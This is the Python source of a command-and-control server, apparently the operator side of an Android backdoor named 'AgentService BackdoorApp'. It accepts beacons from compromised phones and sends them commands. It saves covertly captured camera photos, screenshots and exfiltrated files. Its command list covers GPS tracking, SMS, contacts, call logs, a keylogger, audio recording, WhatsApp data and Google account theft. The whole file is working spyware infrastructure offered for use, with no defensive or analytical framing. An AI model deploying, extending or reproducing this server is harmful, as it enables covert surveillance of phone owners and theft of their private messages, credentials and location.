#!/usr/bin/env python3
"""
LazyFramework C2 Server - Flask + Socket
Kompatibel dengan AgentService BackdoorApp
"""

import socket
import json
import threading
import logging
import sqlite3
import datetime
import os
import base64
import glob
from flask import Flask, render_template, request, jsonify, session, send_file
from flask_cors import CORS
import secrets
import hashlib
from config import C2_HOST, C2_PORT, DATABASE, SECRET_KEY, ADMIN_PASSWORD
from database import init_db, save_agent, save_command, save_result, get_agents, get_commands, get_results, get_stats
import queue

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('c2.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==================== FLASK APP ====================
app = Flask(__name__)
app.secret_key = SECRET_KEY
CORS(app)

# ==================== GLOBAL STATE ====================
agents = {}  # {agent_id: agent_socket_handler}
command_queue = queue.Queue()
lock = threading.Lock()

# ==================== AGENT HANDLER CLASS ====================
class AgentHandler(threading.Thread):
    """Handle komunikasi dengan individual agent"""
    
    def __init__(self, client_socket, client_address):
        super().__init__(daemon=True)
        self.socket = client_socket
        self.address = client_address
        self.agent_id = None
        self.device_info = {}
        self.connected = True
        self.last_seen = datetime.datetime.now()
        
    def send_command(self, command_data):
        """Send command ke agent"""
        try:
            if isinstance(command_data, dict):
                command_str = json.dumps(command_data)
            else:
                command_str = command_data
            
            self.socket.sendall((command_str + '\n').encode('utf-8'))
            logger.info(f"📤 Command sent to {self.agent_id}: {command_data}")
            return True
        except Exception as e:
            logger.error(f"❌ Send error to {self.agent_id}: {e}")
            self.connected = False
            return False
    
    def recv_data(self):
        """Receive data dari agent"""
        try:
            data = b''
            while True:
                chunk = self.socket.recv(4096)
                if not chunk:
                    return None
                data += chunk
                if b'\n' in data:
                    break
            
            return data.decode('utf-8', errors='ignore').strip()
        except socket.timeout:
            return None
        except Exception as e:
            logger.error(f"❌ Recv error from {self.agent_id}: {e}")
            return None
    
    def handle_beacon(self, beacon_data):
        """Handle beacon dari agent"""
        try:
            self.agent_id = beacon_data.get('id')
            self.device_info = {
                'device': beacon_data.get('device'),
                'android': beacon_data.get('android'),
                'manufacturer': beacon_data.get('manufacturer'),
                'timestamp': beacon_data.get('timestamp')
            }
            self.last_seen = datetime.datetime.now()
            
            save_agent(
                agent_id=self.agent_id,
                device=self.device_info.get('device'),
                android_version=self.device_info.get('android'),
                manufacturer=self.device_info.get('manufacturer'),
                last_seen=self.last_seen
            )
            
            with lock:
                agents[self.agent_id] = self
            
            logger.info(f"✅ Agent connected: {self.agent_id} ({self.device_info.get('device')})")
            
        except Exception as e:
            logger.error(f"❌ Beacon error: {e}")
    
    def handle_response(self, response_data):
        """Handle response dari agent"""
        try:
            command = response_data.get('command')
            agent_id = response_data.get('agent_id')
            result = response_data.get('result')
            timestamp = response_data.get('timestamp')
            command_id = response_data.get('command_id')
            
            # ============ HANDLE CAMERA SNAPSHOT ============
            if isinstance(result, dict) and result.get('type') == 'camera_snapshot':
                image_data = result.get('image_data')
                if image_data:
                    os.makedirs('photos', exist_ok=True)
                    timestamp_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"photos/{agent_id}_snapshot_{timestamp_str}.jpg"
                    
                    image_bytes = base64.b64decode(image_data)
                    with open(filename, 'wb') as f:
                        f.write(image_bytes)
                    
                    logger.info(f"📸 Photo saved: {filename} ({len(image_bytes)} bytes)")
                    
                    result['image_data'] = f"<saved to {filename}>"
                    result['file_path'] = filename
            
            # ============ HANDLE SCREENSHOT ============
            elif isinstance(result, dict) and result.get('type') == 'screenshot':
                image_data = result.get('image_data')
                if image_data:
                    os.makedirs('screenshots', exist_ok=True)
                    timestamp_str = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"screenshots/{agent_id}_screenshot_{timestamp_str}.jpg"
                    
                    image_bytes = base64.b64decode(image_data)
                    with open(filename, 'wb') as f:
                        f.write(image_bytes)
                    
                    logger.info(f"🖼️ Screenshot saved: {filename} ({len(image_bytes)} bytes)")
                    
                    result['image_data'] = f"<saved to {filename}>"
                    result['file_path'] = filename
            
            # ============ HANDLE FILE DOWNLOAD ============
            elif isinstance(result, dict) and result.get('type') == 'file_download':
                file_data = result.get('data')
                filename = result.get('filename')
                if file_data and filename:
                    os.makedirs('downloads', exist_ok=True)
                    save_path = f"downloads/{agent_id}_{filename}"
                    
                    file_bytes = base64.b64decode(file_data)
                    with open(save_path, 'wb') as f:
                        f.write(file_bytes)
                    
                    logger.info(f"💾 File downloaded: {save_path}")
                    
                    result['data'] = f"<saved to {save_path}>"
                    result['file_path'] = save_path
            
            # Save to database
            save_result(
                agent_id=agent_id,
                command=command,
                result=json.dumps(result) if isinstance(result, dict) else result,
                command_id=command_id,
                timestamp=timestamp
            )
            
            self.last_seen = datetime.datetime.now()
            logger.info(f"📥 Result received from {agent_id}: {command}")
            
            # Log status
            if isinstance(result, dict) and result.get('status'):
                logger.info(f"   Status: {result.get('status')}")
            
        except Exception as e:
            logger.error(f"❌ Response error: {e}")
    
    def run(self):
        """Main thread loop - listen untuk data dari agent"""
        self.socket.settimeout(60)
        
        try:
            while self.connected:
                data = self.recv_data()
                
                if data is None:
                    logger.warning(f"⚠️ No data from {self.agent_id}, disconnecting")
                    break
                
                if not data:
                    continue
                
                try:
                    msg = json.loads(data)
                    msg_type = msg.get('type')
                    
                    if msg_type == 'beacon':
                        self.handle_beacon(msg)
                    elif msg_type == 'response':
                        self.handle_response(msg)
                    elif msg_type == 'PONG':
                        logger.debug(f"🏓 PONG from {self.agent_id}")
                        self.last_seen = datetime.datetime.now()
                    else:
                        logger.warning(f"⚠️ Unknown message type: {msg_type}")
                        
                except json.JSONDecodeError as e:
                    logger.warning(f"❌ JSON decode error: {data[:100]}")
                    
        except Exception as e:
            logger.error(f"❌ Handler error for {self.agent_id}: {e}")
        finally:
            self.disconnect()
    
    def disconnect(self):
        """Disconnect agent"""
        try:
            self.connected = False
            self.socket.close()
            if self.agent_id in agents:
                with lock:
                    del agents[self.agent_id]
            logger.info(f"🔌 Agent disconnected: {self.agent_id}")
        except Exception as e:
            logger.error(f"❌ Disconnect error: {e}")

# ==================== SOCKET SERVER ====================
def socket_server():
    """Run socket server untuk menerima connections dari agents"""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server_socket.bind((C2_HOST, C2_PORT))
        server_socket.listen(5)
        logger.info(f"🚀 Socket server listening on {C2_HOST}:{C2_PORT}")
        
        while True:
            try:
                client_socket, client_address = server_socket.accept()
                logger.info(f"🔗 New connection from {client_address}")
                
                handler = AgentHandler(client_socket, client_address)
                handler.start()
                
            except Exception as e:
                logger.error(f"❌ Accept error: {e}")
                
    except Exception as e:
        logger.error(f"❌ Socket server error: {e}")
    finally:
        server_socket.close()

# ==================== COMMAND SENDER THREAD ====================
def command_sender():
    """Thread untuk send pending commands ke agents"""
    while True:
        try:
            pending = get_commands(status='pending', limit=10)
            
            for cmd in pending:
                agent_id = cmd['agent_id']
                
                with lock:
                    if agent_id in agents:
                        agent_handler = agents[agent_id]
                        
                        command_data = {
                            'id': cmd['id'],
                            'command': cmd['command'],
                            'timestamp': datetime.datetime.now().isoformat()
                        }
                        
                        if agent_handler.send_command(command_data):
                            save_command(cmd['id'], status='sent')
                        else:
                            logger.warning(f"⚠️ Agent {agent_id} not responding")
            
            threading.Event().wait(1)
            
        except Exception as e:
            logger.error(f"❌ Command sender error: {e}")
            threading.Event().wait(5)

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Dashboard homepage"""
    if 'username' not in session:
        return render_template('login.html')
    
    agents_list = get_agents()
    stats = get_stats()
    return render_template('dashboard.html', agents=agents_list, stats=stats)

@app.route('/login', methods=['POST'])
def login():
    """Login endpoint"""
    data = request.get_json()
    password = data.get('password', '')
    
    if hashlib.sha256(password.encode()).hexdigest() == hashlib.sha256(ADMIN_PASSWORD.encode()).hexdigest():
        session['username'] = 'admin'
        session.permanent = True
        return jsonify({'status': 'success'})
    else:
        return jsonify({'status': 'error', 'message': 'Invalid password'}), 401

@app.route('/logout')
def logout():
    """Logout endpoint"""
    session.clear()
    return jsonify({'status': 'success'})

@app.route('/api/agents')
def api_agents():
    """Get all connected agents"""
    agents_list = []
    with lock:
        for agent_id, handler in agents.items():
            agents_list.append({
                'agent_id': agent_id,
                'device': handler.device_info.get('device'),
                'android_version': handler.device_info.get('android'),
                'manufacturer': handler.device_info.get('manufacturer'),
                'last_seen': handler.last_seen.isoformat(),
                'online': handler.connected
            })
    
    return jsonify(agents_list)

@app.route('/api/agent/<agent_id>')
def api_agent_detail(agent_id):
    """Get agent detail"""
    agent_data = None
    
    with lock:
        if agent_id in agents:
            handler = agents[agent_id]
            agent_data = {
                'agent_id': agent_id,
                'device': handler.device_info.get('device'),
                'android_version': handler.device_info.get('android'),
                'manufacturer': handler.device_info.get('manufacturer'),
                'last_seen': handler.last_seen.isoformat(),
                'online': handler.connected
            }
    
    if agent_data:
        return jsonify(agent_data)
    else:
        return jsonify({'error': 'Agent not found'}), 404

@app.route('/api/command', methods=['POST'])
def api_command():
    """Send command ke agent"""
    data = request.get_json()
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    if not agent_id or not command:
        return jsonify({'error': 'Missing agent_id or command'}), 400
    
    cmd_id = save_command(agent_id=agent_id, command=command, status='pending')
    
    with lock:
        if agent_id in agents:
            handler = agents[agent_id]
            command_data = {
                'id': cmd_id,
                'command': command,
                'timestamp': datetime.datetime.now().isoformat()
            }
            
            if handler.send_command(command_data):
                save_command(cmd_id, status='sent')
                return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': True})
            else:
                return jsonify({'status': 'error', 'message': 'Failed to send command'}), 500
    
    return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': False, 'message': 'Pending'})

@app.route('/api/results/<agent_id>')
def api_results(agent_id):
    """Get results dari agent"""
    limit = request.args.get('limit', 20, type=int)
    results = get_results(agent_id=agent_id, limit=limit)
    
    return jsonify(results)

@app.route('/api/ping/<agent_id>', methods=['POST'])
def api_ping(agent_id):
    """Send PING ke agent"""
    with lock:
        if agent_id in agents:
            handler = agents[agent_id]
            if handler.socket:
                try:
                    handler.socket.sendall(b'PING\n')
                    return jsonify({'status': 'success'})
                except Exception as e:
                    return jsonify({'error': str(e)}), 500
    
    return jsonify({'error': 'Agent not found'}), 404

# ==================== PHOTO ROUTES ====================

@app.route('/api/photo/<agent_id>/<filename>')
def api_get_photo(agent_id, filename):
    """Get photo from agent"""
    photo_dir = 'photos'
    if not os.path.exists(photo_dir):
        return jsonify({'error': 'No photos'}), 404
    
    for f in os.listdir(photo_dir):
        if f.startswith(agent_id) and filename in f:
            filepath = os.path.join(photo_dir, f)
            return send_file(filepath, mimetype='image/jpeg')
    
    return jsonify({'error': 'Photo not found'}), 404

@app.route('/api/photos/<agent_id>')
def api_list_photos(agent_id):
    """List all photos from agent"""
    photo_dir = 'photos'
    if not os.path.exists(photo_dir):
        return jsonify({'photos': []})
    
    pattern = f"{photo_dir}/{agent_id}_snapshot_*.jpg"
    files = glob.glob(pattern)
    
    photos = []
    for f in files:
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
        photos.append({
            'filename': filename,
            'size': size,
            'size_formatted': format_file_size(size),
            'modified': modified,
            'url': f'/api/photo/{agent_id}/{filename}'
        })
    
    return jsonify({
        'agent_id': agent_id,
        'count': len(photos),
        'photos': photos
    })

# ==================== SCREENSHOT ROUTES ====================

@app.route('/api/screenshot/<agent_id>/<filename>')
def api_get_screenshot(agent_id, filename):
    """Get screenshot from agent"""
    screenshot_dir = 'screenshots'
    if not os.path.exists(screenshot_dir):
        return jsonify({'error': 'No screenshots'}), 404
    
    for f in os.listdir(screenshot_dir):
        if f.startswith(agent_id) and filename in f:
            filepath = os.path.join(screenshot_dir, f)
            return send_file(filepath, mimetype='image/jpeg')
    
    return jsonify({'error': 'Screenshot not found'}), 404

@app.route('/api/screenshots/<agent_id>')
def api_list_screenshots(agent_id):
    """List all screenshots from agent"""
    screenshot_dir = 'screenshots'
    if not os.path.exists(screenshot_dir):
        return jsonify({'screenshots': []})
    
    pattern = f"{screenshot_dir}/{agent_id}_screenshot_*.jpg"
    files = glob.glob(pattern)
    
    screenshots = []
    for f in files:
        filename = os.path.basename(f)
        size = os.path.getsize(f)
        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
        screenshots.append({
            'filename': filename,
            'size': size,
            'size_formatted': format_file_size(size),
            'modified': modified,
            'url': f'/api/screenshot/{agent_id}/{filename}'
        })
    
    return jsonify({
        'agent_id': agent_id,
        'count': len(screenshots),
        'screenshots': screenshots
    })

# ==================== DOWNLOAD ROUTES ====================

@app.route('/api/download/<agent_id>/<filename>')
def api_get_download(agent_id, filename):
    """Get downloaded file from agent"""
    download_dir = 'downloads'
    if not os.path.exists(download_dir):
        return jsonify({'error': 'No downloads'}), 404
    
    for f in os.listdir(download_dir):
        if f.startswith(agent_id) and filename in f:
            filepath = os.path.join(download_dir, f)
            return send_file(filepath, as_attachment=True)
    
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/downloads/<agent_id>')
def api_list_downloads(agent_id):
    """List all downloaded files from agent"""
    download_dir = 'downloads'
    if not os.path.exists(download_dir):
        return jsonify({'downloads': []})
    
    pattern = f"{download_dir}/{agent_id}_*"
    files = glob.glob(pattern)
    
    downloads = []
    for f in files:
        filename = os.path.basename(f)
        # Remove agent_id prefix
        display_name = filename.replace(f"{agent_id}_", "")
        size = os.path.getsize(f)
        modified = datetime.datetime.fromtimestamp(os.path.getmtime(f)).isoformat()
        downloads.append({
            'filename': display_name,
            'original': filename,
            'size': size,
            'size_formatted': format_file_size(size),
            'modified': modified,
            'url': f'/api/download/{agent_id}/{filename}'
        })
    
    return jsonify({
        'agent_id': agent_id,
        'count': len(downloads),
        'downloads': downloads
    })

# ==================== SET WALLPAPER ROUTE ====================

@app.route('/api/set_wallpaper', methods=['POST'])
def api_set_wallpaper():
    """Set wallpaper on agent"""
    data = request.get_json()
    agent_id = data.get('agent_id')
    image_url = data.get('image_url')
    image_data = data.get('image_data')
    
    if not agent_id:
        return jsonify({'error': 'agent_id required'}), 400
    
    if not image_url and not image_data:
        return jsonify({'error': 'image_url or image_data required'}), 400
    
    command = "SET_WALLPAPER"
    if image_url:
        command += " " + image_url
    elif image_data:
        command += " " + image_data
    
    cmd_id = save_command(agent_id=agent_id, command=command, status='pending')
    
    with lock:
        if agent_id in agents:
            handler = agents[agent_id]
            command_data = {
                'id': cmd_id,
                'command': command,
                'timestamp': datetime.datetime.now().isoformat()
            }
            
            if handler.send_command(command_data):
                save_command(cmd_id, status='sent')
                return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': True})
    
    return jsonify({'status': 'success', 'command_id': cmd_id, 'sent': False, 'message': 'Pending'})

# ==================== STATUS ROUTES ====================

@app.route('/api/status')
def api_status():
    """Get C2 server status"""
    with lock:
        agent_count = len(agents)
    
    stats = get_stats()
    
    return jsonify({
        'status': 'online',
        'agents_connected': agent_count,
        'pending_commands': stats.get('pending_commands', 0),
        'total_results': stats.get('results', 0),
        'timestamp': datetime.datetime.now().isoformat()
    })

@app.route('/api/help')
def api_help():
    """Get available commands"""
    commands = [
        "GET_DEVICE_INFO - Get device information",
        "GET_LOCATION - Get GPS location",
        "GET_CLIPBOARD - Get clipboard content",
        "GET_INSTALLED_APPS - List installed apps",
        "GET_CONTACTS - Get contacts (100)",
        "GET_SMS - Get SMS (50)",
        "GET_CALL_LOGS - Get call logs (50)",
        "GET_GALLERY - Get recent photos (50)",
        "GET_FILES_LIST - List files in /sdcard",
        "RECORD_AUDIO - Record audio (30s)",
        "STOP_RECORDING - Stop recording",
        "KEYLOG_START - Start keylogger",
        "KEYLOG_STOP - Stop keylogger",
        "KEYLOG_DUMP - Get keylogs",
        "WA_INFO - Get WhatsApp info",
        "WA_CONTACTS - Get WhatsApp contacts",
        "GET_ACCOUNTS - Get device accounts",
        "GET_GOOGLE_ACCOUNTS - Get Google accounts",
        "CAMERA_SNAPSHOT - Take photo with camera",
        "SCREENSHOT - Capture screen",
        "SET_WALLPAPER <URL/base64> - Set wallpaper",
        "SHOW_TOAST - Show toast message",
        "HELP - Show this help"
    ]
    
    return jsonify({
        'commands': commands,
        'count': len(commands)
    })

# ==================== HELPER FUNCTIONS ====================

def format_file_size(size):
    """Format file size"""
    if size <= 0:
        return "0 B"
    units = ["B", "KB", "MB", "GB"]
    digit_groups = int((len(str(size)) - 1) / 3)
    return f"{size / (1024 ** digit_groups):.1f} {units[digit_groups]}"

# ==================== ERROR HANDLERS ====================

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def server_error(error):
    return jsonify({'error': 'Server error'}), 500

# ==================== MAIN ====================

if __name__ == '__main__':
    # Initialize database
    init_db()
    
    # Create directories
    os.makedirs('photos', exist_ok=True)
    os.makedirs('screenshots', exist_ok=True)
    os.makedirs('downloads', exist_ok=True)
    
    # Start socket server thread
    socket_thread = threading.Thread(target=socket_server, daemon=True)
    socket_thread.start()
    
    # Start command sender thread
    sender_thread = threading.Thread(target=command_sender, daemon=True)
    sender_thread.start()
    
    logger.info("🚀 LazyFramework C2 Server Starting")
    logger.info(f"📁 Photos directory: photos/")
    logger.info(f"📁 Screenshots directory: screenshots/")
    logger.info(f"📁 Downloads directory: downloads/")
    
    # Run Flask app
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,
        threaded=True,
        use_reloader=False    )
